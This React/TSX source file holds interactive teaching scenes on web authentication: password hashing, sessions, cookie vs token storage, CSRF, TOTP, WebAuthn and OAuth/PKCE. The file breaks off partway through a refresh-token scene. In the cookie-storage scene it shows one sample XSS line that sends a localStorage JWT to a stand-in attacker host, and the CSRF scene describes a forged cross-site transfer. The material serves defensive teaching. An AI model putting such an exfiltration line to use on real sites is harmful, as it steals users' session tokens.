'use client';

import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  CheckCircle2,
  XCircle,
  AlertTriangle,
  ShieldCheck,
  ShieldAlert,
  Lock,
  Unlock,
  Key,
  KeyRound,
  Laptop,
  Server,
  Database,
  Smartphone,
  User,
  RefreshCw,
  Clock,
  Cpu,
  ArrowRight,
  FileText,
  Globe,
  Sliders,
  Send,
  Sparkles,
  Terminal,
  Eye,
  EyeOff,
  Radio,
  Layers,
  Fingerprint
} from 'lucide-react';

interface SceneProps {
  step: number;
}

// -------------------------------------------------------------
// 01. authn-vs-authz-foundations
// -------------------------------------------------------------
export function SceneAuthnVsAuthz({ step }: SceneProps) {
  const [role, setRole] = useState<'guest' | 'passenger' | 'pilot'>('passenger');

  return (
    <div className="space-y-4">
      <div className="grid md:grid-cols-2 gap-4">
        {/* Station 1: Authentication */}
        <div className={`p-4 rounded-2xl border transition-all ${
          step <= 2
            ? 'bg-zinc-900/90 border-emerald-500/50 shadow-lg'
            : 'bg-zinc-950/60 border-zinc-800 opacity-80'
        }`}>
          <div className="flex items-center justify-between border-b border-zinc-800 pb-2 mb-3">
            <div className="flex items-center gap-2">
              <span className="p-1 rounded-md bg-emerald-500/10 text-emerald-400">
                <User className="w-4 h-4" />
              </span>
              <span className="text-xs font-bold uppercase tracking-wider text-emerald-400">
                Station 1: Authentication (AuthN)
              </span>
            </div>
            <span className="text-[10px] font-mono text-zinc-400">Question: &quot;Who are you?&quot;</span>
          </div>

          <div className="space-y-2.5">
            <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 flex items-center justify-between text-xs">
              <div className="flex items-center gap-2.5">
                <div className="w-8 h-8 rounded-lg bg-zinc-800 flex items-center justify-center font-bold text-zinc-300">
                  {role === 'guest' ? '?' : 'AJ'}
                </div>
                <div>
                  <div className="font-semibold text-zinc-200">
                    {role === 'guest' ? 'Unauthenticated Caller' : 'Alice Johnson'}
                  </div>
                  <div className="text-[10px] text-zinc-500 font-mono">
                    {role === 'guest' ? 'No session attached' : 'user_id: usr_42'}
                  </div>
                </div>
              </div>
              <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold ${
                role === 'guest'
                  ? 'bg-rose-500/10 text-rose-400 border border-rose-500/20'
                  : 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20'
              }`}>
                {role === 'guest' ? '401 Unauthorized' : '200 Verified'}
              </span>
            </div>

            <div className="text-[11px] text-zinc-400 leading-relaxed">
              {step === 0 && 'Alice presents credentials (password + TOTP) to the identity gateway.'}
              {step === 1 && (role === 'guest' ? 'Credentials missing or invalid. Rejected immediately with 401.' : 'Cryptographic hash verified. Identity established as Alice (ID: 42).')}
              {step >= 2 && 'Identity token minted and passed downstream to authorization.'}
            </div>
          </div>
        </div>

        {/* Station 2: Authorization */}
        <div className={`p-4 rounded-2xl border transition-all ${
          step >= 3
            ? 'bg-zinc-900/90 border-emerald-500/50 shadow-lg'
            : 'bg-zinc-950/60 border-zinc-800 opacity-80'
        }`}>
          <div className="flex items-center justify-between border-b border-zinc-800 pb-2 mb-3">
            <div className="flex items-center gap-2">
              <span className="p-1 rounded-md bg-emerald-500/10 text-emerald-400">
                <ShieldCheck className="w-4 h-4" />
              </span>
              <span className="text-xs font-bold uppercase tracking-wider text-emerald-400">
                Station 2: Authorization (AuthZ)
              </span>
            </div>
            <span className="text-[10px] font-mono text-zinc-400">Question: &quot;What can you do?&quot;</span>
          </div>

          <div className="space-y-2">
            <div className="grid grid-cols-2 gap-2 text-xs">
              <div className="p-2.5 rounded-xl bg-zinc-950 border border-zinc-800">
                <div className="text-[10px] text-zinc-500 uppercase font-mono">Cabin Door (Seat 12A)</div>
                <div className="flex items-center justify-between mt-1">
                  <span className="font-semibold text-zinc-300">Passenger Area</span>
                  <span className={`text-[10px] font-bold ${role !== 'guest' ? 'text-emerald-400' : 'text-zinc-600'}`}>
                    {role !== 'guest' ? 'PERMIT (200)' : 'LOCKED'}
                  </span>
                </div>
              </div>

              <div className="p-2.5 rounded-xl bg-zinc-950 border border-zinc-800">
                <div className="text-[10px] text-zinc-500 uppercase font-mono">Cockpit Door (Flight Deck)</div>
                <div className="flex items-center justify-between mt-1">
                  <span className="font-semibold text-zinc-300">Flight Controls</span>
                  <span className={`text-[10px] font-bold ${role === 'pilot' ? 'text-emerald-400' : 'text-rose-400'}`}>
                    {role === 'pilot' ? 'PERMIT (200)' : 'DENY (403)'}
                  </span>
                </div>
              </div>
            </div>

            <div className="text-[11px] text-zinc-400 leading-relaxed">
              {step < 3 && 'Waiting for verified identity before evaluating permissions.'}
              {step === 3 && 'Policy Enforcement Point (PEP) intercepts request for Cockpit Door.'}
              {step === 4 && `Evaluating policy: Is role (${role}) in [Pilot]?`}
              {step === 5 && (role === 'pilot' ? 'Authorized: Captain allowed into flight deck.' : '403 Forbidden: Identity is authentic Alice, but she is NOT authorized to fly the plane!')}
            </div>
          </div>
        </div>
      </div>

      {/* Persona Toggle */}
      <div className="flex items-center justify-between p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-xs">
        <span className="text-zinc-400 font-mono">Test Caller Persona:</span>
        <div className="flex gap-1.5 font-mono text-[11px]">
          {(['guest', 'passenger', 'pilot'] as const).map((r) => (
            <button
              key={r}
              onClick={() => setRole(r)}
              className={`px-3 py-1 rounded-lg capitalize transition ${
                role === r
                  ? 'bg-emerald-600 text-white font-bold'
                  : 'bg-zinc-800 text-zinc-400 hover:text-zinc-200'
              }`}
            >
              {r}
            </button>
          ))}
        </div>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 02. passwords-salting-argon2id
// -------------------------------------------------------------
export function ScenePasswordHashing({ step }: SceneProps) {
  const [algo, setAlgo] = useState<'sha256' | 'bcrypt' | 'argon2id'>('argon2id');

  return (
    <div className="space-y-4">
      {/* Visual Memory Matrix & Salt Shaker */}
      <div className="grid md:grid-cols-2 gap-4">
        <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-3">
          <div className="flex items-center justify-between text-xs border-b border-zinc-800 pb-2">
            <span className="text-emerald-400 font-bold font-mono">Password Input &amp; Salt Infusion</span>
            <span className="text-[10px] text-zinc-500 font-mono">RFC 9106</span>
          </div>

          <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 font-mono text-xs space-y-2">
            <div>
              <span className="text-zinc-500">Plaintext Password: </span>
              <span className="text-zinc-200 font-bold">&quot;correct-horse-battery-staple&quot;</span>
            </div>
            <div>
              <span className="text-zinc-500">Salt (CSPRNG 128-bit): </span>
              <span className={step >= 1 ? 'text-emerald-400' : 'text-zinc-600'}>
                {step >= 1 ? '$salt$7f9a2b8e4c1d6f30' : '[ Awaiting Salt ]'}
              </span>
            </div>
            <div>
              <span className="text-zinc-500">Memory Matrix (m_cost): </span>
              <span className={algo === 'argon2id' ? 'text-emerald-400 font-bold' : 'text-zinc-400'}>
                {algo === 'argon2id' ? '65,536 KB (64 MB RAM)' : algo === 'bcrypt' ? '4 KB (CPU-bound)' : '0 KB (Unsafe)'}
              </span>
            </div>
          </div>

          {/* 4x4 Memory Block Matrix */}
          <div className="space-y-1.5">
            <div className="text-[10px] text-zinc-500 font-mono uppercase">
              Argon2id 64MB Memory Grid Iteration ({Math.min(step, 3)} of 3 Passes):
            </div>
            <div className="grid grid-cols-4 gap-1.5">
              {Array.from({ length: 16 }).map((_, i) => {
                const filled = algo === 'argon2id' && step >= 2 && (i < (step * 5) || step >= 4);
                return (
                  <div
                    key={i}
                    className={`h-6 rounded-md flex items-center justify-center font-mono text-[9px] border transition-all duration-300 ${
                      filled
                        ? 'bg-emerald-500/20 border-emerald-500/40 text-emerald-400'
                        : 'bg-zinc-950 border-zinc-800 text-zinc-700'
                    }`}
                  >
                    B{i + 1}
                  </div>
                );
              })}
            </div>
          </div>
        </div>

        {/* GPU Crack Speed Simulator */}
        <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-3">
          <div className="flex items-center justify-between text-xs border-b border-zinc-800 pb-2">
            <span className="text-emerald-400 font-bold font-mono">8x NVIDIA RTX 4090 GPU Cluster Attack</span>
            <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold ${
              algo === 'sha256' ? 'bg-rose-500/20 text-rose-400' : 'bg-emerald-500/20 text-emerald-400'
            }`}>
              {algo === 'sha256' ? 'VULNERABLE' : 'HARDENED'}
            </span>
          </div>

          <div className="space-y-2 text-xs font-mono">
            <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 space-y-1 text-[11px]">
              <div>
                <span className="text-zinc-500">Hash Rate: </span>
                <span className={algo === 'sha256' ? 'text-rose-400 font-bold' : 'text-emerald-400 font-bold'}>
                  {algo === 'sha256' ? '150 Billion / sec' : algo === 'bcrypt' ? '12,000 / sec' : '150 / sec (Memory-Stalled)'}
                </span>
              </div>
              <div>
                <span className="text-zinc-500">Estimated Crack Time: </span>
                <span className={algo === 'sha256' ? 'text-rose-400 font-bold' : 'text-emerald-400 font-bold'}>
                  {algo === 'sha256' ? '3.4 Seconds' : algo === 'bcrypt' ? '8.4 Years' : '450+ Years (Impracticable)'}
                </span>
              </div>
            </div>

            <div className="p-2.5 rounded-xl bg-zinc-950 border border-zinc-800 text-[10px] text-zinc-400">
              <span className="text-zinc-300 font-bold">Why Argon2id Wins: </span>
              GPUs have thousands of cores but tiny cache. Argon2id forces 64MB of RAM per hash, completely starving GPU memory buses.
            </div>
          </div>

          {/* Algorithm Toggle */}
          <div className="grid grid-cols-3 gap-2 pt-1 font-mono text-[10px]">
            {(['argon2id', 'bcrypt', 'sha256'] as const).map((a) => (
              <button
                key={a}
                onClick={() => setAlgo(a)}
                className={`py-1.5 px-2 rounded-lg uppercase font-bold text-center transition ${
                  algo === a
                    ? 'bg-emerald-600 text-white'
                    : 'bg-zinc-800 text-zinc-400 hover:text-zinc-200'
                }`}
              >
                {a}
              </button>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 03. registration-email-verification
// -------------------------------------------------------------
export function SceneRegistrationVerification({ step }: SceneProps) {
  return (
    <div className="grid md:grid-cols-3 gap-4 font-mono text-xs">
      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="text-emerald-400 font-bold text-[11px] uppercase">1. User Registration</div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] space-y-1">
          <div><span className="text-zinc-500">Email:</span> alice@cosmos.app</div>
          <div><span className="text-zinc-500">DB Status:</span> <span className="text-amber-400">verified: false</span></div>
        </div>
        <div className="text-[10px] text-zinc-400">Account created in pending state. Direct login restricted.</div>
      </div>

      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="text-emerald-400 font-bold text-[11px] uppercase">2. Crypto Token Hash</div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] space-y-1">
          <div><span className="text-zinc-500">Raw Token:</span> <span className="text-emerald-400">tok_32byte_rand</span></div>
          <div><span className="text-zinc-500">DB Store:</span> SHA256(token)</div>
          <div><span className="text-zinc-500">TTL Clock:</span> 24 Hours</div>
        </div>
        <div className="text-[10px] text-zinc-400">Raw token is sent ONLY via email; never stored in plaintext in DB.</div>
      </div>

      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="text-emerald-400 font-bold text-[11px] uppercase">3. Magic Link Verification</div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] space-y-1">
          <div><span className="text-zinc-500">User Click:</span> GET /verify?t=...</div>
          <div><span className="text-zinc-500">DB State:</span> <span className={step >= 4 ? 'text-emerald-400 font-bold' : 'text-zinc-500'}>{step >= 4 ? 'verified: true ✅' : 'pending'}</span></div>
          <div><span className="text-zinc-500">Token Status:</span> <span className={step >= 5 ? 'text-rose-400' : 'text-zinc-400'}>{step >= 5 ? 'Consumed (Single-Use)' : 'Valid'}</span></div>
        </div>
        <div className="text-[10px] text-zinc-400">Single-use enforcement stops replay attacks cold.</div>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 04. account-recovery-password-reset
// -------------------------------------------------------------
export function SceneAccountRecovery({ step }: SceneProps) {
  return (
    <div className="grid md:grid-cols-2 gap-4 text-xs font-mono">
      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="flex items-center justify-between border-b border-zinc-800 pb-1">
          <span className="text-emerald-400 font-bold">Timing-Safe Enumeration Defense</span>
          <span className="text-[10px] text-zinc-500">OWASP ASVS</span>
        </div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] space-y-1">
          <div className="text-zinc-400">Request: POST /auth/forgot-password {'{ email }'}</div>
          <div className="text-emerald-400 font-bold">&quot;If an account exists, a reset link was dispatched.&quot;</div>
          <div className="text-[10px] text-zinc-500 pt-1">Response time identical whether email exists or not. Zero information leakage.</div>
        </div>
      </div>

      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="flex items-center justify-between border-b border-zinc-800 pb-1">
          <span className="text-rose-400 font-bold">Global Session Invalidation</span>
          <span className="text-[10px] text-zinc-500">Zero-Trust Kill Switch</span>
        </div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] space-y-1">
          <div><span className="text-zinc-500">Action:</span> User submits new password</div>
          <div><span className="text-zinc-500">DB Execution:</span> <span className="text-rose-400 font-bold">DELETE FROM sessions WHERE user_id = 42</span></div>
          <div className="text-emerald-400 font-bold">{step >= 4 ? 'All active cookies & refresh tokens revoked globally!' : 'Sessions active'}</div>
        </div>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 05. session-lifecycle-security
// -------------------------------------------------------------
export function SceneSessionLifecycle({ step }: SceneProps) {
  return (
    <div className="space-y-4 text-xs font-mono">
      <div className="grid md:grid-cols-2 gap-4">
        {/* Session Fixation Defense */}
        <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
          <div className="flex items-center justify-between border-b border-zinc-800 pb-1">
            <span className="text-emerald-400 font-bold">Session Fixation Defense</span>
            <span className="text-[10px] text-zinc-500">Regeneration</span>
          </div>
          <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 space-y-1.5 text-[11px]">
            <div>
              <span className="text-zinc-500">Attacker Pre-Set ID: </span>
              <span className={step >= 3 ? 'line-through text-rose-500' : 'text-amber-400 font-bold'}>
                SESS_TRAP_001
              </span>
            </div>
            <div>
              <span className="text-zinc-500">Post-Login Minted ID: </span>
              <span className={step >= 3 ? 'text-emerald-400 font-bold' : 'text-zinc-600'}>
                {step >= 3 ? 'SESS_FRESH_992 (Regenerated)' : '[ Waiting for login ]'}
              </span>
            </div>
            <div className="text-[10px] text-zinc-400 pt-1">
              On authentication, old session identifier is instantly destroyed. Attacker cookie points to dead session.
            </div>
          </div>
        </div>

        {/* Dual Timeout Matrix */}
        <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
          <div className="flex items-center justify-between border-b border-zinc-800 pb-1">
            <span className="text-emerald-400 font-bold">Dual Timeout Matrix</span>
            <span className="text-[10px] text-zinc-500">RFC 6265</span>
          </div>
          <div className="grid grid-cols-2 gap-2 text-[11px]">
            <div className="p-2.5 rounded-xl bg-zinc-950 border border-zinc-800">
              <div className="text-zinc-500 text-[10px] uppercase">Idle Timeout</div>
              <div className="text-emerald-400 font-bold mt-1">15 Minutes</div>
              <div className="text-[9px] text-zinc-500">Sliding: resets on user activity</div>
            </div>
            <div className="p-2.5 rounded-xl bg-zinc-950 border border-zinc-800">
              <div className="text-zinc-500 text-[10px] uppercase">Absolute Lifetime</div>
              <div className="text-amber-400 font-bold mt-1">8 Hours Max</div>
              <div className="text-[9px] text-zinc-500">Hard stop: forces re-authentication</div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 06. cookies-vs-tokens-storage
// -------------------------------------------------------------
export function SceneCookiesVsTokens({ step }: SceneProps) {
  const [storageType, setStorageType] = useState<'localstorage' | 'httponly'>('httponly');

  return (
    <div className="space-y-4 text-xs font-mono">
      <div className="grid md:grid-cols-2 gap-4">
        {/* LocalStorage Box */}
        <div className={`p-4 rounded-2xl border transition ${
          storageType === 'localstorage' ? 'bg-zinc-900 border-rose-500/50 shadow-lg' : 'bg-zinc-950/60 border-zinc-800'
        }`}>
          <div className="flex items-center justify-between border-b border-zinc-800 pb-1 mb-2">
            <span className="text-rose-400 font-bold">LocalStorage (Bearer Token)</span>
            <span className="text-[10px] text-rose-500 font-bold">XSS VULNERABLE</span>
          </div>
          <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] space-y-1">
            <div className="text-zinc-500">Accessible by JavaScript: <span className="text-rose-400 font-bold">YES</span></div>
            <pre className="p-2 rounded bg-rose-950/30 text-rose-300 text-[10px] overflow-x-auto">
              fetch(&apos;https://evil.io/steal?t=&apos; + localStorage.getItem(&apos;jwt&apos;))
            </pre>
            <div className="text-[10px] text-rose-400">Any injected script (XSS) steals the token instantly!</div>
          </div>
        </div>

        {/* HttpOnly Cookie Box */}
        <div className={`p-4 rounded-2xl border transition ${
          storageType === 'httponly' ? 'bg-zinc-900 border-emerald-500/50 shadow-lg' : 'bg-zinc-950/60 border-zinc-800'
        }`}>
          <div className="flex items-center justify-between border-b border-zinc-800 pb-1 mb-2">
            <span className="text-emerald-400 font-bold">HttpOnly Cookie (Recommended)</span>
            <span className="text-[10px] text-emerald-400 font-bold">IMMUNE TO XSS</span>
          </div>
          <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] space-y-1">
            <div className="text-zinc-500">Accessible by JavaScript: <span className="text-emerald-400 font-bold">NO (BLOCKED)</span></div>
            <pre className="p-2 rounded bg-emerald-950/30 text-emerald-300 text-[10px] overflow-x-auto">
              Set-Cookie: token=...; HttpOnly; Secure; SameSite=Lax
            </pre>
            <div className="text-[10px] text-emerald-400">Browser completely hides cookie from document.cookie and XSS scripts!</div>
          </div>
        </div>
      </div>

      <div className="flex items-center justify-between p-3 rounded-xl bg-zinc-950 border border-zinc-800">
        <span className="text-zinc-400">Toggle Storage Mode:</span>
        <div className="flex gap-2">
          <button
            onClick={() => setStorageType('localstorage')}
            className={`px-3 py-1 rounded-lg text-xs font-bold transition ${
              storageType === 'localstorage' ? 'bg-rose-600 text-white' : 'bg-zinc-800 text-zinc-400'
            }`}
          >
            LocalStorage
          </button>
          <button
            onClick={() => setStorageType('httponly')}
            className={`px-3 py-1 rounded-lg text-xs font-bold transition ${
              storageType === 'httponly' ? 'bg-emerald-600 text-white' : 'bg-zinc-800 text-zinc-400'
            }`}
          >
            HttpOnly Cookie
          </button>
        </div>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 07. csrf-protection-synchronizer
// -------------------------------------------------------------
export function SceneCsrfProtection({ step }: SceneProps) {
  return (
    <div className="grid md:grid-cols-2 gap-4 text-xs font-mono">
      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="flex items-center justify-between border-b border-zinc-800 pb-1">
          <span className="text-rose-400 font-bold">Cross-Site Request Forgery</span>
          <span className="text-[10px] text-zinc-500">The Threat</span>
        </div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] space-y-1">
          <div><span className="text-zinc-500">Victim Visits:</span> evil-site.com</div>
          <div><span className="text-zinc-500">Auto-Submit:</span> POST bank.com/transfer?amount=5000</div>
          <div><span className="text-zinc-500">Browser Default:</span> Attaches bank.com session cookie automatically!</div>
        </div>
      </div>

      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="flex items-center justify-between border-b border-zinc-800 pb-1">
          <span className="text-emerald-400 font-bold">Dual Defense Shield</span>
          <span className="text-[10px] text-zinc-500">The Fix</span>
        </div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] space-y-1">
          <div><span className="text-zinc-500">1. SameSite=Lax/Strict:</span> Browser refuses cookie on cross-site POST.</div>
          <div><span className="text-zinc-500">2. CSRF Token:</span> Secret token injected in form; evil site cannot read it (SOP).</div>
          <div className="text-emerald-400 font-bold pt-1">Attack defeated: Server returns 403 Forbidden!</div>
        </div>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 08. distributed-sessions-redis
// -------------------------------------------------------------
export function SceneDistributedRedis({ step }: SceneProps) {
  return (
    <div className="space-y-4 text-xs font-mono">
      <div className="grid md:grid-cols-3 gap-3">
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800">
          <div className="text-zinc-500 text-[10px] uppercase">Server US-East</div>
          <div className="text-zinc-200 font-bold mt-1">Handles Request 1</div>
          <div className="text-[10px] text-emerald-400 mt-1">Queries Redis: 0.8ms</div>
        </div>
        <div className="p-3 rounded-xl bg-zinc-900 border border-emerald-500/40 text-center">
          <div className="text-emerald-400 font-bold uppercase text-[10px]">Central Redis Cluster</div>
          <div className="text-zinc-200 font-bold font-mono my-1">sess:alice_usr42</div>
          <div className="text-[10px] text-zinc-400">In-Memory Key-Value Store</div>
        </div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800">
          <div className="text-zinc-500 text-[10px] uppercase">Server US-West</div>
          <div className="text-zinc-200 font-bold mt-1">Handles Request 2</div>
          <div className="text-[10px] text-emerald-400 mt-1">Queries Redis: 0.8ms</div>
        </div>
      </div>
      <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] text-zinc-400">
        <span className="text-emerald-400 font-bold">Global Kill-Switch: </span>
        When user clicks &quot;Sign Out Everywhere&quot;, server runs <code className="text-zinc-200">DEL sess:alice_*</code> on Redis. Both US-East and US-West immediately reject requests with 401 Unauthorized.
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 09. mfa-totp-hotp-rfc6238
// -------------------------------------------------------------
export function SceneTotpMfa({ step }: SceneProps) {
  const [seconds, setSeconds] = useState(24);
  const [code, setCode] = useState('849 201');

  const advanceWindow = () => {
    setCode(`${Math.floor(100 + Math.random() * 900)} ${Math.floor(100 + Math.random() * 900)}`);
    setSeconds(30);
  };

  return (
    <div className="grid md:grid-cols-2 gap-4 text-xs font-mono">
      {/* Phone Display */}
      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 flex flex-col items-center justify-between text-center space-y-3">
        <span className="text-zinc-400 text-[11px]">Google / 1Password Authenticator</span>
        <div className="text-4xl font-extrabold tracking-widest text-emerald-400 py-2">
          {code}
        </div>
        <div className="w-full space-y-1">
          <div className="w-full h-2 rounded-full bg-zinc-800 overflow-hidden">
            <div
              className="h-full bg-emerald-500 transition-all duration-1000"
              style={{ width: `${(seconds / 30) * 100}%` }}
            />
          </div>
          <div className="text-[10px] text-zinc-500">{seconds}s remaining in timestep</div>
        </div>
        <button
          onClick={advanceWindow}
          className="px-3 py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-[10px] transition"
        >
          Advance 30s Window
        </button>
      </div>

      {/* RFC 6238 Pipeline */}
      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="text-emerald-400 font-bold text-[11px] border-b border-zinc-800 pb-1">
          RFC 6238 Algorithmic Derivation
        </div>
        <div className="space-y-1 text-[11px] text-zinc-300">
          <div><span className="text-zinc-500">1. Shared Secret:</span> JBSWY3DPEHPK3PXP (Base32)</div>
          <div><span className="text-zinc-500">2. Time Counter T:</span> floor(UnixEpoch / 30)</div>
          <div><span className="text-zinc-500">3. HMAC-SHA1(K, T):</span> 20-byte hash</div>
          <div><span className="text-zinc-500">4. Dynamic Truncation:</span> Offset = hash[19] &amp; 0x0F</div>
          <div><span className="text-zinc-500">5. Modulo 10^6:</span> <span className="text-emerald-400 font-bold">{code}</span></div>
        </div>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 10. webauthn-passkeys-fido2
// -------------------------------------------------------------
export function SceneWebAuthn({ step }: SceneProps) {
  return (
    <div className="grid md:grid-cols-2 gap-4 text-xs font-mono">
      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="flex items-center gap-2 border-b border-zinc-800 pb-1">
          <Fingerprint className="w-4 h-4 text-emerald-400" />
          <span className="text-emerald-400 font-bold">Hardware Secure Enclave</span>
        </div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] space-y-1.5">
          <div><span className="text-zinc-500">Biometric Sensor:</span> Touch ID / Face ID</div>
          <div><span className="text-zinc-500">Asymmetric Private Key:</span> <span className="text-emerald-400 font-bold">Locked in Silicon</span></div>
          <div className="text-[10px] text-zinc-400">The private key NEVER leaves the device hardware, making remote credential theft impossible.</div>
        </div>
      </div>

      <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
        <div className="flex items-center gap-2 border-b border-zinc-800 pb-1">
          <ShieldCheck className="w-4 h-4 text-emerald-400" />
          <span className="text-emerald-400 font-bold">Phishing Resistance (Domain Binding)</span>
        </div>
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-[11px] space-y-1.5">
          <div><span className="text-zinc-500">Allowed Origin:</span> cscosmos.app</div>
          <div><span className="text-zinc-500">Attacker Fake Site:</span> evil-cscosmos.app</div>
          <div className="text-[10px] text-emerald-400 font-bold">Browser injects real origin into the signed challenge. Attacker phishing proxy is mathematically rejected!</div>
        </div>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 11. oauth2-core-framework-roles
// -------------------------------------------------------------
export function SceneOAuthRoles({ step }: SceneProps) {
  const roles = [
    { title: 'Resource Owner', desc: 'Alice (The End User who owns data)', icon: User },
    { title: 'Client Application', desc: 'CosmosApp SPA / Mobile App', icon: Laptop },
    { title: 'Authorization Server', desc: 'Google / Auth0 IdP (Issues Tokens)', icon: ShieldCheck },
    { title: 'Resource Server', desc: 'Photos / Drive API (Accepts Bearer Tokens)', icon: Server },
  ];

  return (
    <div className="grid sm:grid-cols-2 md:grid-cols-4 gap-3 text-xs font-mono">
      {roles.map((r, i) => {
        const Icon = r.icon;
        const active = (step % 4) === i;
        return (
          <div
            key={r.title}
            className={`p-3.5 rounded-2xl border transition ${
              active
                ? 'bg-zinc-900 border-emerald-500/50 shadow-md'
                : 'bg-zinc-950 border-zinc-800 opacity-70'
            }`}
          >
            <div className="flex items-center gap-2 mb-1.5">
              <Icon className="w-4 h-4 text-emerald-400" />
              <span className="font-bold text-zinc-200 text-[11px]">{r.title}</span>
            </div>
            <div className="text-[10px] text-zinc-400 leading-snug">{r.desc}</div>
          </div>
        );
      })}
    </div>
  );
}

// -------------------------------------------------------------
// 12. oauth2-pkce-flow-rfc9700
// -------------------------------------------------------------
export function SceneOAuthPkce({ step }: SceneProps) {
  return (
    <div className="space-y-4 text-xs font-mono">
      <div className="grid md:grid-cols-2 gap-4">
        <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
          <div className="flex items-center justify-between border-b border-zinc-800 pb-1">
            <span className="text-emerald-400 font-bold">Client Browser Memory (Private)</span>
            <span className="text-[10px] text-zinc-500">RFC 7636</span>
          </div>
          <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 space-y-1 text-[11px]">
            <div><span className="text-zinc-500">Code Verifier:</span> <span className="text-amber-300 font-bold">dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk</span></div>
            <div><span className="text-zinc-500">Code Challenge (S256):</span> <span className="text-emerald-400 font-bold">E9Melhoa2OwvFrGMTJguCH5rtG6479bPWSMN</span></div>
            <div><span className="text-zinc-500">State (CSRF Defense):</span> <span className="text-zinc-300">st_9f2c1a8e</span></div>
          </div>
        </div>

        <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 space-y-2">
          <div className="flex items-center justify-between border-b border-zinc-800 pb-1">
            <span className="text-rose-400 font-bold">Attacker Interception Attempt</span>
            <span className="text-[10px] text-zinc-500">Mitigated</span>
          </div>
          <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 space-y-1 text-[11px]">
            <div><span className="text-zinc-500">Intercepted:</span> Auth Code (?code=auth_123)</div>
            <div><span className="text-zinc-500">Attacker Exchanging:</span> POST /oauth/token (Missing Verifier!)</div>
            <div className="text-rose-400 font-bold">Server Rejection: 400 Invalid Grant!</div>
          </div>
        </div>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 13. oauth2-machine-to-machine
// -------------------------------------------------------------
export function SceneOAuthM2M({ step }: SceneProps) {
  return (
    <div className="grid md:grid-cols-3 gap-3 text-xs font-mono">
      <div className="p-3.5 rounded-xl bg-zinc-950 border border-zinc-800 space-y-1">
        <div className="text-zinc-400 font-bold text-[11px]">Billing Microservice</div>
        <div className="text-[10px] text-zinc-500">Client ID + Secret sent over TLS directly to IdP</div>
      </div>
      <div className="p-3.5 rounded-xl bg-zinc-900 border border-emerald-500/40 space-y-1 text-center">
        <div className="text-emerald-400 font-bold text-[11px]">IdP Auth Server</div>
        <div className="text-[10px] text-zinc-300">Issues JWT with scope: <span className="text-emerald-400">payments:charge</span></div>
      </div>
      <div className="p-3.5 rounded-xl bg-zinc-950 border border-zinc-800 space-y-1">
        <div className="text-zinc-400 font-bold text-[11px]">Payment Gateway</div>
        <div className="text-[10px] text-zinc-500">Validates JWT signature statelessly &amp; executes charge</div>
      </div>
    </div>
  );
}

// -------------------------------------------------------------
// 14. refresh-tokens-rotation
// -------------------------------------------------------------
export function SceneRefreshTokenRotation({ step }: SceneProps) {
  return (
    <div className="space-y-4 text-xs font-mono">
      <div className="grid md:grid-cols-3 gap-3">
        <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 space-y-1">
